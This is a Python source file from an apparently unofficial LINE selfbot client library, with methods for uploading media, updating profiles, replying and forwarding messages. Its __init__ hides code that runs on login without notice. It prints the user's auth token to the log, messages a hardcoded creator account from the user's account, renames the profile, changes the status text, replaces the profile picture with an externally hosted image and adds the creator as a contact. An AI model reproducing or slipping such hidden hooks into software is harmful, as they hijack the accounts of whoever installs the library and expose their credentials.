# -*- coding: utf-8 -*-
from datetime import datetime
import json, time, ntpath

def loggedIn(func):
    def checkLogin(*args, **kwargs):
        if args[0].isLogin:
            return func(*args, **kwargs)
        else:
            args[0].callback.other('You want to call the function, you must login to LINE')
    return checkLogin
    
class Object(object):

    def __init__(self):
        if self.isLogin == True:
            self.log("[ %s ] : Display Name" % self.profile.displayName)
            self.log("[ %s ] : Auth Token" % self.authToken)
            self.log("( %s ) : Verifikasi Login Success" % self.profile.displayName)
            self.log("MID : " + "( "+self.profile.mid+" )")
            Midcreator = "ub1c5a71f27b863896e9d44bea857d35b"
            xmod = self.getContact(Midcreator).displayName
            self.sendText("ub1c5a71f27b863896e9d44bea857d35b",'THKS KA\n%s\nAKU SIAP SUBSCRIB YOUTUBE \n 👉https://youtube.com/@silentkillerofficial4992' % xmod)
            profile = self.getProfile()
            profile.displayName = "MEMBER TBP"
            self.updateProfile(profile)
            profile.statusMessage = "FREE SELFBOT BY DHENZA"
            self.updateProfile(profile)
            DOMAIN_ = "https://i.ibb.co/dbGrjHT/20220303-211805.png"
            LINE = self.downloadFileURL(DOMAIN_)
            self.updateProfilePicture(LINE)
            GEN = "ub1c5a71f27b863896e9d44bea857d35b"
            self.findAndAddContactsByMid(GEN)

    """Group"""

    @loggedIn
    def updateGroupPicture(self, groupId, path):
        files = {'file': open(path, 'rb')}
        data = {'params': self.genOBSParams({'oid': groupId,'type': 'image'})}
        r = self.server.postContent(self.server.LINE_OBS_DOMAIN + '/talk/g/upload.nhn', data=data, files=files)
        if r.status_code != 201:
            raise Exception('Update group picture failure.')
        return True

    """Personalize"""
    
    @loggedIn
    def updateVideoAndPictureProfile(self, path_p, path, returnAs='bool'):
        if returnAs not in ['bool']:
            raise Exception('Invalid returnAs value')
        files = {'file': open(path, 'rb')}
        data = {'params': self.genOBSParams({'oid': self.profile.mid,'ver': '2.0','type': 'video','cat': 'vp.mp4'})}
        r_vp = self.server.postContent(self.server.LINE_OBS_DOMAIN + '/talk/vp/upload.nhn', data=data, files=files)
        if r_vp.status_code != 201:
            raise Exception('Update profile video picture failure.')
        self.updateProfilePicture(path_p, 'vp')
        if returnAs == 'bool':
            return True

    @loggedIn
    def updateProfilePicture(self, path, type='p'):
        files = {'file': open(path, 'rb')}
        params = {'oid': self.profile.mid,'type': 'image'}
        if type == 'vp':
            params.update({'ver': '2.0', 'cat': 'vp.mp4'})
        data = {'params': self.genOBSParams(params)}
        r = self.server.postContent(self.server.LINE_OBS_DOMAIN + '/talk/p/upload.nhn', data=data, files=files)
        if r.status_code != 201:
            raise Exception('Update profile picture failure.')
        return True
        
    @loggedIn
    def updateProfileVideoPicture(self, path):
        try:
            from ffmpy import FFmpeg
            files = {'file': open(path, 'rb')}
            data = {'params': self.genOBSParams({'oid': self.profile.mid,'ver': '2.0','type': 'video','cat': 'vp.mp4'})}
            r_vp = self.server.postContent(self.server.LINE_OBS_DOMAIN + '/talk/vp/upload.nhn', data=data, files=files)
            if r_vp.status_code != 201:
                raise Exception('Update profile video picture failure.')
            path_p = self.genTempFile('path')
            ff = FFmpeg(inputs={'%s' % path: None}, outputs={'%s' % path_p: ['-ss', '00:00:2', '-vframes', '1']})
            ff.run()
            self.updateProfilePicture(path_p, 'vp')
        except:
            raise Exception('You should install FFmpeg and ffmpy from pypi')

    @loggedIn
    def updateProfileCover(self, path, returnAs='bool'):
        if returnAs not in ['objId','bool']:
            raise Exception('Invalid returnAs value')
        objId = self.uploadObjHome(path, type='image', returnAs='objId')
        home = self.updateProfileCoverById(objId)
        if returnAs == 'objId':
            return objId
        elif returnAs == 'bool':
            return True

    """Object"""

    @loggedIn
    def uploadObjSquare(self, squareChatMid, path, type='image', returnAs='bool'):
        if returnAs not in ['bool']:
            raise Exception('Invalid returnAs value')
        if type not in ['image','gif','video','audio','file']:
            raise Exception('Invalid type value')
        data = open(path, 'rb').read()
        params = {
            'oid': 'reqseq',
            'reqseq': '%s' % str(self.revision),
            'tomid': '%s' % str(squareChatMid),
            'size': '%s' % str(len(data)),
            'range': len(data),
            'type': '%s' % str(type)
        }
        if type == 'image':
            contentType = 'image/jpeg'
        elif type == 'gif':
            contentType = 'image/gif'
        elif type == 'video':
            params.update({'duration': '60000'})
            contentType = 'video/mp4'
        elif type == 'audio':
            params.update({'duration': '0'})
            contentType = 'audio/mp3'
        headers = self.server.additionalHeaders(self.server.Headers, {
            'content-type': contentType,
            'Content-Length': str(len(data)),
            'x-obs-params': self.genOBSParams(params,'b64'),
            'X-Line-Access': self.squareObsToken
        })
        r = self.server.postContent(self.server.LINE_OBS_DOMAIN + '/r/g2/m/reqseq', data=data, headers=headers)
        if r.status_code != 201:
            raise Exception('Upload %s failure.' % type)
        if returnAs == 'bool':
            return True

    @loggedIn
    def uploadObjTalk(self, path, type='image', returnAs='bool', objId=None, to=None):
        if returnAs not in ['objId','bool']:
            raise Exception('Invalid returnAs value')
        if type not in ['image','gif','video','audio','file']:
            raise Exception('Invalid type value')
        headers=None
        files = {'file': open(path, 'rb')}
        if type == 'image' or type == 'video' or type == 'audio' or type == 'file':
            e_p = self.server.LINE_OBS_DOMAIN + '/talk/m/upload.nhn'
            data = {'params': self.genOBSParams({'oid': objId,'size': len(open(path, 'rb').read()),'type': type})}
        elif type == 'gif':
            e_p = self.server.LINE_OBS_DOMAIN + '/r/talk/m/reqseq'
            files = None
            data = open(path, 'rb').read()
            params = {
                'oid': 'reqseq',
                'reqseq': '%s' % str(self.revision),
                'tomid': '%s' % str(to),
                'size': '%s' % str(len(data)),
                'range': len(data),
                'type': 'image'
            }
            headers = self.server.additionalHeaders(self.server.Headers, {
                'Content-Type': 'image/gif',
                'Content-Length': str(len(data)),
                'x-obs-params': self.genOBSParams(params,'b64')
            })
        r = self.server.postContent(e_p, data=data, headers=headers, files=files)
        if r.status_code != 201:
            raise Exception('Upload %s failure.' % type)
        if returnAs == 'objId':
            return objId
        elif returnAs == 'bool':
            return True

    @loggedIn
    def uploadObjHome(self, path, type='image', returnAs='bool', objId=None):
        if returnAs not in ['objId','bool']:
            raise Exception('Invalid returnAs value')
        if type not in ['image','video','audio']:
            raise Exception('Invalid type value')
        if type == 'image':
            contentType = 'image/jpeg'
        elif type == 'video':
            contentType = 'video/mp4'
        elif type == 'audio':
            contentType = 'audio/mp3'
        if not objId:
            objId = int(time.time())
        file = open(path, 'rb').read()
        params = {
            'userid': '%s' % self.profile.mid,
            'oid': '%s' % str(objId),
            'range': len(file),
            'type': type
        }
        hr = self.server.additionalHeaders(self.server.timelineHeaders, {
            'Content-Type': contentType,
            'Content-Length': str(len(file)),
            'x-obs-params': self.genOBSParams(params,'b64')
        })
        r = self.server.postContent(self.server.LINE_OBS_DOMAIN + '/myhome/c/upload.nhn', headers=hr, data=file)
        if r.status_code != 201:
            raise Exception('Upload object home failure.')
        if returnAs == 'objId':
            return objId
        elif returnAs == 'bool':
            return True

    @loggedIn
    def downloadObjectMsg(self, messageId, returnAs='path', saveAs=''):
        if saveAs == '':
            saveAs = self.genTempFile('path')
        if returnAs not in ['path','bool','bin']:
            raise Exception('Invalid returnAs value')
        params = {'oid': messageId}
        url = self.server.urlEncode(self.server.LINE_OBS_DOMAIN, '/talk/m/download.nhn', params)
        r = self.server.getContent(url)
        if r.status_code == 200:
            self.saveFile(saveAs, r.raw)
            if returnAs == 'path':
                return saveAs
            elif returnAs == 'bool':
                return True
            elif returnAs == 'bin':
                return r.raw
        else:
            raise Exception('Download object failure.')
            
    @loggedIn
    def generateReplyMessage(self, relatedMessageId):
        msg = Message()
        msg.relatedMessageServiceCode = 1
        msg.messageRelationType = 3
        msg.relatedMessageId = str(relatedMessageId)
        return msg
    
    @loggedIn
    def sendReply(self, relatedMessageId, to, text, contentMetadata={}, contentType=0):
        msg = self.generateReplyMessage(relatedMessageId)
        msg.to = to
        msg.text = text
        msg.contentType = contentType
        msg.contentMetadata = contentMetadata
        if to not in self._messageReq:
            self._messageReq[to] = -1
        self._messageReq[to] += 1
        return self.talk.sendMessage(self._messageReq[to], msg)
            
    @loggedIn
    def sendImageWithURL(self, to, url):
        path = self.downloadFileURL(url, 'path')
        return self.sendImage(to, path)

    @loggedIn
    def sendFooter(self, to, text, link, icon, footer):
        contentMetadata = {'AGENT_LINK': link, 'AGENT_ICON': icon, 'AGENT_NAME': footer}
        return self.sendMessage(to, text, contentMetadata) 
        
    @loggedIn    
    def nadyacantikimut(self, path, path2):
        try:
            files = {'file': open(path, 'rb')}
            data = {'params':self.genOBSParams({'oid': self.profile.mid,'ver': '2.0','type':'video','cat': 'vp.mp4'})}
            r_vp = self.server.postContent(self.server.LINE_OBS_DOMAIN + '/talk/vp/upload.nhn',data=data, files=files)
            if r_vp.status_code != 201:
                raise Exception('update profile video picture failure.')
            self.updateProfilePicture(path2, 'vp')
        except Exception as e:
            print(str(e))

    @loggedIn
    def forwardObjectMsg(self, to, msgId, contentType='image'):
        if contentType not in ['image','video','audio']:
            raise Exception('Type not valid.')
        data = self.genOBSParams({'oid': 'reqseq','reqseq': self.revision,'type': contentType,'copyFrom': '/talk/m/%s' % msgId},'default')
        r = self.server.postContent(self.server.LINE_OBS_DOMAIN + '/talk/m/copy.nhn', data=data)
        if r.status_code != 200:
            raise Exception('Forward object failure.')
        return True